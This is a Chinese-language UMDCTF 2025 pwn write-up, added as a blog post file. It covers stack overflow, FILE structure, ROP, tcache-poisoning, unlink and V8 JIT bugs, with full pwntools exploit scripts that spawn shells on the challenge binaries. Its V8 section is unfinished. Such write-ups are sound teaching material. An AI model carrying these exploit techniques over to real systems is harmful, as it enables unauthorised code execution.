@@ -1,0 +1,881 @@
+export const layout = "#components/Page.js";
+export const title = "UMDCTF 2025 Writeup";
+export const description = "2025 UMDCTF Pwn 题解";
+export const created = "2025-05-08";
+
+# UMDCTF 2025 Writeup
+
+比赛时间和 ACTF2025 基本上冲突了，所以没时间打，赛时只来得及看了两道签到题就遗憾离场，赛后补了所有的用户态题目，剩了几道 v8 暂时摸了（（
+
+
+## gambling2
+
+题目给了源码：
+
+```c
+#include <stdio.h>
+#include <string.h>
+#include <stdlib.h>
+
+float rand_float() {
+  float x = (float)rand() / RAND_MAX;
+  printf("%f\n", x);
+  return x;
+}
+
+void print_money() {
+	system("/bin/sh");
+}
+
+void gamble() {
+	float f[4];
+	float target = rand_float();
+	printf("Enter your lucky numbers: ");
+	scanf(" %lf %lf %lf %lf %lf %lf %lf", f,f+1,f+2,f+3,f+4,f+5,f+6);
+	if (f[0] == target || f[1] == target || f[2] == target || f[3] == target || f[4] == target || f[5] == target || f[6] == target) {
+		printf("You win!\n");
+		// due to economic concerns, we're no longer allowed to give out prizes.
+		// print_money();
+	} else {
+		printf("Aww dang it!\n");
+	}
+}
+
+int main(void) {
+    setvbuf(stdout, NULL, _IONBF, 0);
+    setvbuf(stdin, NULL, _IONBF, 0);
+
+	char buf[20];
+	srand(420);
+	while (1) {
+		gamble();
+		getc(stdin); // consume newline
+		printf("Try again? ");
+		fgets(buf, 20, stdin);
+		if (strcmp(buf, "no.\n") == 0) {
+			break;
+		}
+	}
+}
+```
+
+
+简单调试一下发现，`gamble` 函数里生命的 `f` 是 `float` 四字节类型，且只有 4 个，读入时却读入了 `double` 类型且读入了 7 个，存在栈溢出，ret2text。
+
+问题在怎么比较方便地将一个十六进制数进行 IEEE754 解码（将这个结果输入给 scanf 在内存里就会得到 backdoor）
+
+这里用的方法有两种：
+
+
+**第一种**：
+
+```c
+#include <stdio.h>
+
+union test {
+    double x;
+    long long y;
+} a;
+
+
+int main() {
+    a.y = 0x80492C000000000;
+    printf("%e\n", a.x);
+    return 0;
+}
+```
+
+在写 poc 的时候，注意 `double` 是 8 字节类型，所以对应的应该使用 `long long`，而且由于栈溢出（可以通过调试得出），这里 `a.y` 应该等于 `0x80492C000000000` 而非 `0x80492C`，编译后运行得到输出：
+
+```bash
+$ ./test
+4.867844e-270
+```
+
+**方法二**：
+
+直接在 gdb 中查看存储浮点数部分的栈：
+
+```
+00:0000│-048 0xffdd4730 ◂— 0
+... ↓     6 skipped
+07:001c│-02c 0xffdd474c —▸ 0x80492c0 (print_money) ◂— sub esp, 0x18  // 这里是溢出点
+```
+
+然后直接查看对应的浮点数：
+
+```bash
+pwndbg> x/gf 0xffdd4748
+0xffdd4748:     4.8678438292920787e-270
+```
+
+exp:
+
+```python
+from pwn import *
+from sys import argv
+import ctypes
+proc = "./gambling_patched"
+context.log_level = "debug"
+context.binary = proc
+elf = ELF(proc, checksec=False)
+io = remote("", ) if argv[1] == 'r' else process(proc)
+
+if args.G:
+    gdb.attach(io, """
+    decompiler connect ida --host 127.0.0.1 --port 3662
+    b *0x8049336
+    """)
+
+# payload = f"0 0 0 0 0 {a} 6.6460445870511132e-316".encode()
+payload = b" 1.0 2.0 3.0 4.0 5.0 6.0 4.8678438292920787e-270"
+io.sendlineafter(b"Enter your lucky numbers: ", payload)
+
+io.interactive()
+```
+
+
+
+
+## aura
+
+题目给了源码：
+
+```c
+#include <stdio.h>
+#include <unistd.h>
+
+int aura = 0;
+
+int main(int argc, char **argv) {
+        setbuf(stdin, NULL);
+        setbuf(stdout, NULL);
+        setbuf(stderr, NULL);
+
+        printf("my aura: %p\nur aura? ", &aura);
+
+        char flag[17];
+        FILE *fp = fopen("/dev/null", "r");
+
+        read(0, fp, 0x100);
+
+        char buf[0x100];
+        fread(buf, 1, 8, fp);
+
+        if (aura) {
+                FILE *f = fopen("flag.txt", "r");
+                fread(flag, 1, 17, f);
+                printf("%s\n ", flag);
+        }  else {
+                printf("u have no aura.\n");
+        }
+
+        return 0;
+}
+```
+
+相当于可以任意写 FILE 结构，要求是通过这个原语修改 `aura > 0`。
+
+满足下列条件即可：
+
+- 设置 `fp->_flags & (~0x4)`（这里最好就是用原来的 `_flags`）（也就是要设置倒数第二字节为 `\x00`）
+- 设置 `_IO_read_end` 等于 `_IO_read_ptr`
+- 设置 `_fileno == 0`
+- 设置 `fp->_IO_buf_base` 为写入的起始位置，`fp->_IO_buf_end` 为写入的终止位置，`fp->_IO_buf_end - fp->_IO_buf_base` 为读入的长度
+
+exp:
+
+```python
+from pwn import *
+context.arch = 'amd64'
+
+p = process('./aura_patched')
+# p = remote("challs.umdctf.io", 31006)
+
+
+if args.G:
+    gdb.attach(p, """
+    breakrva 0x1253
+    """)
+# pause()
+p.recvuntil(b": ")
+leak = int(p.recvline()[:-1],16)
+fp = FileStructure()
+
+payload = fp.read(leak, 0x10)
+p.send(payload)
+p.send(b'0' * 16)
+
+p.interactive()
+```
+
+
+## unfinished
+
+神秘 c++ trick 题。
+
+题目给了源码：
+
+```c
+#include <cstdio>
+#include <cstdlib>
+
+char number[128];
+
+void sigma_mode() {
+    system("/bin/sh");
+}
+
+int main() {
+    setvbuf(stdout, NULL, _IONBF, 0);
+    setvbuf(stdin, NULL, _IONBF, 0);
+
+    printf("What size allocation?\n");
+    fgets(number, 500, stdin);
+
+    long n = atol(number);
+    int *chunk = new int[n];
+    // TODO: finish the heap chal
+}
+```
+
+可以看到给了个可控任意地址的 `new` 和 `backdoor`，还有 bss 上的溢出，读一下源码。
+
+```cc
+_GLIBCXX_WEAK_DEFINITION void *
+operator new (std::size_t sz) _GLIBCXX_THROW (std::bad_alloc)
+{
+  void *p;
+
+  /* malloc (0) is unpredictable; avoid it.  */
+  if (__builtin_expect (sz == 0, false))
+    sz = 1;
+
+  while ((p = malloc (sz)) == 0)
+    {
+      new_handler handler = std::get_new_handler ();
+      if (! handler)
+	_GLIBCXX_THROW_OR_ABORT(bad_alloc());
+      handler ();
+    }
+
+  return p;
+}
+```
+
+这里布置了一个函数指针 `handler`，看一下 `get_new_handler()`：
+
+```cc
+new_handler
+std::get_new_handler () noexcept
+{
+  new_handler handler;
+#if ATOMIC_POINTER_LOCK_FREE > 1
+  __atomic_load (&__new_handler, &handler, __ATOMIC_ACQUIRE);
+#else
+  __gnu_cxx::__scoped_lock l(mx);
+  handler = __new_handler;
+#endif
+  return handler;
+}
+```
+
+注意看，这里有一个 `handler = __new_handler;` 的赋值，右值是一个全局变量....
+
+```cc
+using std::new_handler;
+namespace
+{
+  new_handler __new_handler;
+}
+```
+
+![__new_handler](https://pic1.imgdb.cn/item/681c116a58cb8da5c8e41aae.png)
+
+
+最后一个问题，`malloc` 什么时候返回值为 `0` 呢？答案是当分配一个过大的内存时。
+
+exp：
+
+```python
+#!/usr/bin/env python3
+
+from pwn import *
+from sys import argv
+
+proc = "./unfinished_patched"
+context.log_level = "debug"
+context.binary = proc
+elf = ELF(proc, checksec=False)
+libc = ELF("./libc.so.6", checksec=False)
+io = remote("", ) if argv[1] == 'r' else process(proc)
+
+if args.G:
+    gdb.attach(io, """
+    decompiler connect ida --host 127.0.0.1 --port 3662
+    b* 0x401a47
+    b* 0x4031d0
+    """)
+
+system = 0x4019b6
+payload = b"10000000000".ljust(128, b"a")
+# payload += p64(system) * 50
+# payload += cyclic(0x100, n=8)
+payload += b"a" * 72
+payload += p64(system)
+io.sendlineafter(b"What size allocation?", payload)
+
+io.interactive()
+```
+
+
+## prison-relm
+
+神秘 magic gadget 题。
+
+依然给了源码：
+
+```c
+#include <signal.h>
+#include <stdio.h>
+#include <unistd.h>
+#include <stdlib.h>
+
+// 閉門
+void gate_close() {
+  exit(1);
+}
+
+// Will you get stuck in the prison realm?
+//
+//
+// 獄門疆 開門
+__attribute__((constructor))
+void prison_realm_open() {
+  setvbuf(stdout, NULL, _IONBF, 0);
+  setvbuf(stdin, NULL, _IONBF, 0);
+  signal(SIGALRM, gate_close);
+  alarm(60);
+}
+
+int main() {
+
+  // Geto steps out from behind the activated prison realm...
+  char barrier_dimension_realm[30];
+  fgets(barrier_dimension_realm, 300, stdin);
+}
+```
+
+ida 里可以看到基本上没什么能用的函数，尽管给了几乎无限的栈溢出。
+
+
+那想法肯定是先看看有没有 magic gadget 能用，搜到下面这条：
+
+```
+0x0000000000400668 : add dword ptr [rbp - 0x3d], ebx ; nop dword ptr [rax + rax] ; repz ret
+```
+
+记为 gadget1。
+
+但是没什么用，出题人 patch 了 `__libc_csu_init` 使得题目中没有可以控制 `ebx` 的 gadget，怎么办呢.jpg
+
+接下来真的很神秘，出题人用了下面这个 gadget：
+
+```
+0x00000000004005cf : add bl, dh ; ret
+```
+
+记为 gadget2
+
+`bl` 是 `rbx` 的低 8 位寄存器，`dh` 是 `rdx` 的低 8 位寄存器。
+
+调试一下发现 `dh` 是 0x20，也就是说配合 `gadget1` 可以做到任意地址 + 0x20.... 有什么用呢.jpg
+
+我们调一下 `fgets` 的汇编，发现：
+
+```
+0x70330887f4a0 <_IO_fgets+288>:      mov    BYTE PTR [rdi],0x0
+0x70330887f4a3 <_IO_fgets+291>:      mov    r14,rdi
+0x70330887f4a6 <_IO_fgets+294>:      jmp    0x70330887f44c <_IO_fgets+204>
+0x70330887f4a8 <_IO_fgets+296>:      nop    DWORD PTR [rax+rax*1+0x0]
+0x70330887f4b0 <_IO_fgets+304>:      call   0x703308891300 <__GI___lll_lock_wake_private>
+...
+0x70330887f44c <_IO_fgets+204>:      pop    rbx
+0x70330887f44d <_IO_fgets+205>:      mov    rax,r14
+0x70330887f450 <_IO_fgets+208>:      pop    rbp
+0x70330887f451 <_IO_fgets+209>:      pop    r12
+0x70330887f453 <_IO_fgets+211>:      pop    r13
+0x70330887f455 <_IO_fgets+213>:      pop    r14
+0x70330887f457 <_IO_fgets+215>:      ret
+```
+
+。。。这样我们就能控制 rbx 了... 然后就有任意地址写原语了....
+
+小时候做这题吓哭了。。
+
+exp
+
+```python
+from pwn import *
+from sys import argv
+
+proc = "./prison_patched"
+context.log_level = "debug"
+context.binary = proc
+elf = ELF(proc, checksec=False)
+io = remote("", ) if argv[1] == 'r' else process(proc)
+
+if args.G:
+    gdb.attach(io, """
+    b *0x400718
+    b *0x400782
+    """)
+
+
+# 0x0000000000400668 : add dword ptr [rbp - 0x3d], ebx ; nop dword ptr [rax + rax] ; repz ret
+# 0x00000000004005cf : add bl, dh ; ret
+# 0x0000000000400608 : pop rbp ; ret
+# 0x0000000000400782 : pop rdi ; xor rbx, rbx ; ret
+# 0x0000000000400783 : xor rbx, rbx ; ret
+
+
+magic = 0x400668
+add_bl_dh = 0x4005cf
+pop_rbp_ret = 0x400608
+xor_rbx = 0x400783
+pop_rdi_ret = 0x400782
+fgets_got = elf.got['fgets']
+fgets_plt = elf.plt['fgets']
+offset = 0x6c8a3
+
+
+payload = b"a" * 0x20 + p64(fgets_got + 0x3d)
+payload += flat([add_bl_dh, magic]) * 3 + flat([magic])
+
+payload += flat([pop_rdi_ret, fgets_got - 8, pop_rbp_ret, 1, pop_rdi_ret, 0x6010b8, fgets_plt])
+payload += flat([offset, fgets_got + 0x3d, 0, 0, 0, magic, pop_rbp_ret, 0x6011b8, fgets_plt])
+io.sendline(payload)
+
+
+io.interactive()
+```
+
+:P
+
+这题还能打别的 magic gadget 和 ret2dlresolve，后者板子不会打，学一下再来。
+
+
+## onewrite
+
+2.39 菜单堆，逻辑比较清晰，给了 4 个功能：
+
+```c
+ssize_t alloc_chunk()
+{
+  unsigned int v1; // [rsp+8h] [rbp-8h]
+  unsigned int size; // [rsp+Ch] [rbp-4h]
+
+  my_print("idx: ");
+  v1 = get_int();
+  if ( v1 > 0x63 )
+    _exit(1);
+  my_print("size: ");
+  size = get_int();
+  if ( size > 0x5FF )
+    _exit(1);
+  chunks[v1] = malloc(size);
+  my_print("done!\n");
+  return my_print("...what? did you think you would get a write?\n");
+}
+
+void free_chunk()
+{
+  unsigned int v0; // [rsp+Ch] [rbp-4h]
+
+  my_print("idx: ");
+  v0 = get_int();
+  if ( v0 > 0x63 )
+    _exit(1);
+  free((void *)chunks[v0]);
+}
+
+ssize_t write_chunk()
+{
+  my_print("data: ");
+  return read(0, the_chunk, 0x5F8uLL);
+}
+
+ssize_t read_chunk()
+{
+  return write(1, the_chunk, 0x5F8uLL);
+}
+
+int __fastcall __noreturn main(int argc, const char **argv, const char **envp)
+{
+  int v3; // eax
+
+  the_chunk = malloc(0x5F8uLL);
+  free(the_chunk);
+  while ( 1 )
+  {
+    while ( 1 )
+    {
+      v3 = prompt();
+      if ( v3 != 4 )
+        break;
+      read_chunk();
+    }
+    if ( v3 > 4 )
+      break;
+    switch ( v3 )
+    {
+      case 3:
+        write_chunk();
+        break;
+      case 1:
+        alloc_chunk();
+        break;
+      case 2:
+        free_chunk();
+        break;
+      default:
+        goto LABEL_12;
+    }
+  }
+LABEL_12:
+  _exit(1);
+}
+```
+
+题目的洞其实很明显，就是 `free_chunk` 里的 UAF，所以可以比较方便的泄漏 libc 和 pie，现在问题是题目没有任何 IO 函数，也没有使用 `exit`，所以没办法打 io 链，只能打栈。
+
+但是打栈肯定得先泄漏 environ，这里就有个问题，`write_chunk` 和 `read_chunk` 功能都只能对堆上前 0x5f8 操作。
+
+所以目前只有任意地址申请/释放，但是没有任意地址读写原语。怎么办呢.jpg
+
+在往常做题的观念里，要想泄漏 `environ` 打栈肯定得先有任意地址读，这个原语一般都是通过任意地址申请然后 `show` 实现的，但其实我们忽略了 tcachebins 特别神秘的特性，如下。
+
+首先，假设我们 free 三个堆块进入 tcachebins:
+
+```bash
+tcachebins
+0x30 [  3]: 0x63de3bdf16c0 —▸ 0x63de3bdf16f0 —▸ 0x63de3bdf1720 ◂— 0
+```
+
+然后，我们像往常（tcache posiong）一样，修改：
+
+```bash
+tcachebins
+0x30 [  3]: 0x63de3bdf16c0 —▸ 0x7c9da18046e0 (__libc_argv) ◂— 0x7ff96336b65c
+```
+
+最后，我们申请两个 chunk 出来
+
+```bash
+tcachebins
+0x30 [  1]: 0x7ff96336b65c
+```
+
+
+这说明我们成功的在 `tcache pthread struct` 上踩出了一个栈地址，但这个暂时不能用，因为我们的读函数不能读 tps。
+
+更重要的是，此时我们再释放一个同大小的 chunkA 进入 tcachebins，就可以在 chunkA 的 fd 处同样踩出一个栈地址，这个栈地址正好是我们可以泄漏的地址。
+
+按照这个方法，我们可以泄漏栈上的 pie 地址。
+
+然后简单利用 unlink 任意地址写原语，将 `the_chunk` 写成 `the_chunk - 0x18`，之后打栈或者打 got 表都可以。
+
+exp:
+```python
+#!/usr/bin/env python3
+
+from pwn import *
+from sys import argv
+
+proc = "./one_write_patched"
+context.log_level = "info"
+context.binary = proc
+elf = ELF(proc, checksec=False)
+libc = ELF("./libc.so.6", checksec=False)
+io = remote("", ) if argv[1] == 'r' else process(proc)
+
+if args.G:
+    gdb.attach(io, """
+        dir ~/CTFhub/Problems/Pwn/glibc/malloc
+        b* _int_free_merge_chunk+144
+    """)
+
+
+def choose(id):
+    io.sendlineafter(b"> ", str(id).encode())
+
+
+def alloc(idx, size):
+    choose(1)
+    io.sendlineafter(b"idx: ", str(idx).encode())
+    io.sendlineafter(b"size: ", str(size).encode())
+
+
+def free(idx):
+    choose(2)
+    io.sendlineafter(b"idx: ", str(idx).encode())
+
+
+def write(content):
+    choose(3)
+    io.sendafter(b"data: ", content)
+
+
+def show():
+    choose(4)
+
+
+alloc(0, 0x410)
+alloc(1, 0x410)
+alloc(50, 0x20)
+
+# leak libc and heap address
+free(1)
+alloc(2, 0x20)
+alloc(3, 0x20)
+alloc(4, 0x20)
+alloc(5, 0x20)
+show()
+io.recv(0x420)
+libc_addr = u64(io.recv(8)) - 0x203f10
+libc.address = libc_addr
+log.info(f"libc_addr => {hex(libc_addr)}")
+io.recv(8)
+heap_addr = u64(io.recv(8))
+log.info(f"heap_addr => {hex(heap_addr)}")
+
+# leak __libc_argv to get stack addr
+free(4)
+free(3)
+free(2)
+environ = libc_addr + 0x2046e0
+target = (environ ^ (heap_addr >> 12))
+payload = flat([b"\x00" * 0x410, 0, 0x31,target])
+write(payload)
+alloc(51, 0x20)
+alloc(52, 0x20)
+free(1)
+show()
+io.recv(0x420)
+stack_addr = (u64(io.recv(8)) ^ (heap_addr >> 12) ^ (environ >> 12))
+log.info(f"stack_addr => {hex(stack_addr)}")
+
+# leak pie base via stack
+target = (stack_addr - 0x48) ^ (heap_addr >> 12)
+payload = flat([b"\x00" * 0x410, 0, 0x31, target])
+write(payload)
+alloc(53, 0x20)
+alloc(54, 0x20)
+free(1)
+show()
+io.recv(0x420)
+pie_addr = (u64(io.recv(8)) ^ (heap_addr >> 12) ^ (stack_addr >> 12)) - 0x10b0
+log.info(f"pie_addr => {hex(pie_addr)}")
+
+# write the_chunk by unlink
+alloc(55, 0x20)
+alloc(56, 0x350)
+the_chunk = pie_addr + 0x4080
+payload = flat([b"/bin/sh\x00", 0x411, the_chunk - 0x18, the_chunk - 0x10, b"\x00" * 0x3f0, 0x410, 0x420])
+write(payload)
+free(1)
+
+# hijack free@got to system and get shell
+free_got = pie_addr + 0x4000
+system = libc.sym['system']
+log.info(f"system => {hex(libc.sym['system'])}")
+write(flat([b"\x00" * 0x18, free_got]))
+write(flat([system]))
+
+free(0)
+
+io.interactive()
+```
+
+## offbyone
+
+神秘题目。
+
+给了源码：
+
+```c
+#include <stdio.h>
+#include <stdlib.h>
+
+#define N 10000
+#define BINS 10
+
+int compare (const void *a, const void *b) { return *(float*)a == *(float*)b ? 0 : *(float*)a > *(float*)b ? 1 : -1; }
+
+void vuln() {
+	float data[N];
+	short counts[BINS] = {0};
+	printf("Enter %d floats: ", N);
+	for (int i = 0; i < N; i++) {
+		if (scanf("%f", &data[i]) < 1) {
+			puts("not enough data");
+			exit(-1);
+		}
+	}
+	qsort(data, N, sizeof(float), compare);
+	float min = data[0], max = data[N-1];
+	for (int i = 0; i < N; i++) {
+		int bin = BINS * (data[i] - min) / (max - min);
+		counts[bin]++;
+	}
+	puts("Histogram below:");
+	for (int i = 0; i < BINS; i++) {
+		printf("%d ", i);
+		for (short j = 0; j < counts[i]; j++) putchar('#');
+		putchar('\n');
+	}
+}
+
+int main() {
+	setvbuf(stdin, NULL, _IONBF, 0);
+	setvbuf(stdout, NULL, _IONBF, 0);
+	setvbuf(stderr, NULL, _IONBF, 0);
+	vuln();
+}
+```
+
+洞是在 `qsort` 这里，自定义的 `compare` 函数并没有满足严格弱序，也就是对于浮点数来说，任何数都无法与 `nan` 比大小，但这个 `compare` 函数没有处理 nan，所以可以导致 `max` 不是 `max` 的情况。
+
+通过这种构造，可以让 `bin` 大于 10 产生数组溢出，从而修改返回地址。
+
+但是浮点数实在太神秘了，我调了很久也不是很调得明白，毁了。
+
+
+## finished
+
+神秘 cpp，要伪造一大堆结构，后面看。
+
+## literally-1984
+
+~~v8 不会~~
+
+学会了
+
+看一下 patch 文件
+
+```diff
+diff --git a/src/compiler/machine-operator-reducer.cc b/src/compiler/machine-operator-reducer.cc
+index 2da3715a58f..e6896555188 100644
+--- a/src/compiler/machine-operator-reducer.cc
++++ b/src/compiler/machine-operator-reducer.cc
+@@ -1101,6 +1101,11 @@ Reduction MachineOperatorReducer::ReduceInt32Add(Node* node) {
+   DCHECK_EQ(IrOpcode::kInt32Add, node->opcode());
+   Int32BinopMatcher m(node);
+   if (m.right().Is(0)) return Replace(m.left().node());  // x + 0 => x
++
++  if (m.left().Is(2) && m.right().Is(2)) {
++    return ReplaceInt32(5);
++  }
++
+   if (m.IsFoldable()) {  // K + K => K  (K stands for arbitrary constants)
+     return ReplaceInt32(base::AddWithWraparound(m.left().ResolvedValue(),
+                                                 m.right().ResolvedValue()));
+diff --git a/src/compiler/simplified-lowering.cc b/src/compiler/simplified-lowering.cc
+index 4cc858bb22c..1e0056e7130 100644
+--- a/src/compiler/simplified-lowering.cc
++++ b/src/compiler/simplified-lowering.cc
+@@ -1993,7 +1993,7 @@ class RepresentationSelector {
+             // The bounds check is redundant if we already know that
+             // the index is within the bounds of [0.0, length[.
+             // TODO(neis): Move this into TypedOptimization?
+-            if (v8_flags.turbo_typer_hardening) {
++            if (v8_flags.turbo_typer_hardening && 2 + 2 == 5) {
+               new_flags |= CheckBoundsFlag::kAbortOnOutOfBounds;
+             } else {
+               DeferReplacement(node, NodeProperties::GetValueInput(node, 0));
+```
+
+发现出题人没有禁用 v8 常用的系统函数，检查 dockerfile 发现 flag 的名称也是已知的，那么直接打就行：
+
+```js
+console.log(read("/flag"));
+```
+
+## literally-1985
+
+~~v8 不会....~~
+
+~~呜呜呜 什么时候才能学会 v8~~
+
+真学会了，喵喵咪咪。
+
+
+```diff
+diff --git a/src/compiler/machine-operator-reducer.cc b/src/compiler/machine-operator-reducer.cc
+index 2da3715a58f..e6896555188 100644
+--- a/src/compiler/machine-operator-reducer.cc
++++ b/src/compiler/machine-operator-reducer.cc
+@@ -1101,6 +1101,11 @@ Reduction MachineOperatorReducer::ReduceInt32Add(Node* node) {
+   DCHECK_EQ(IrOpcode::kInt32Add, node->opcode());
+   Int32BinopMatcher m(node);
+   if (m.right().Is(0)) return Replace(m.left().node());  // x + 0 => x
++
++  if (m.left().Is(2) && m.right().Is(2)) {
++    return ReplaceInt32(5);
++  }
++
+   if (m.IsFoldable()) {  // K + K => K  (K stands for arbitrary constants)
+     return ReplaceInt32(base::AddWithWraparound(m.left().ResolvedValue(),
+                                                 m.right().ResolvedValue()));
+diff --git a/src/compiler/simplified-lowering.cc b/src/compiler/simplified-lowering.cc
+index 4cc858bb22c..1e0056e7130 100644
+--- a/src/compiler/simplified-lowering.cc
++++ b/src/compiler/simplified-lowering.cc
+@@ -1993,7 +1993,7 @@ class RepresentationSelector {
+             // The bounds check is redundant if we already know that
+             // the index is within the bounds of [0.0, length[.
+             // TODO(neis): Move this into TypedOptimization?
+-            if (v8_flags.turbo_typer_hardening) {
++            if (v8_flags.turbo_typer_hardening && 2 + 2 == 5) {
+               new_flags |= CheckBoundsFlag::kAbortOnOutOfBounds;
+             } else {
+               DeferReplacement(node, NodeProperties::GetValueInput(node, 0));
+diff --git a/src/d8/d8.cc b/src/d8/d8.cc
+index 24fe0b6056e..6362b213a82 100644
+--- a/src/d8/d8.cc
++++ b/src/d8/d8.cc
+@@ -3829,6 +3829,7 @@ Local<FunctionTemplate> Shell::CreateNodeTemplates(
+
+ Local<ObjectTemplate> Shell::CreateGlobalTemplate(Isolate* isolate) {
+   Local<ObjectTemplate> global_template = ObjectTemplate::New(isolate);
++  /*
+   global_template->Set(Symbol::GetToStringTag(isolate),
+                        String::NewFromUtf8Literal(isolate, "global"));
+   global_template->Set(isolate, "version",
+@@ -3876,6 +3877,7 @@ Local<ObjectTemplate> Shell::CreateGlobalTemplate(Isolate* isolate) {
+     global_template->Set(isolate, "async_hooks",
+                          Shell::CreateAsyncHookTemplate(isolate));
+   }
++  */
+
+   return global_template;
+ }
+```
+
+出题人禁用了系统函数，这次应该是要打正常的 oob 了。
+
+分析一下 diff 文件，发现出题人在优化编译器上增加了攻击面，复习一下知识点：
+
+为了平衡启动速度和运行效率，V8 执行 JavaScript 代码分为几个层次：
+
+1. 解释器：当一段 JS 代码首次执行时，为了能快速启动，V8 会先用 Ignition 解释器来逐行执行。
+2. 优化编译器：V8 的运行时会监控代码的执行情况。如果它发现某一个函数被频繁地、重复地调用（我们称之为“热”代码，Hot Code），V8 就会认为这个函数值得花时间去优化。这时，它会把这个函数交给 TurboFan。
+
+
+因此为了触发这个 bug，需要写一个包含 `2 + 2` 的函数，并把它强制变热来看到效果。
+
+另外这个 `2 + 2 = 5` 是可以绕过 OOB 检测的，就可以通过修改 JSArray 的 length 字段，拿到一个几乎可以无限读写的数组，
+
+~~编译器 TurboFan~~
+
+还没写完，咕咕....
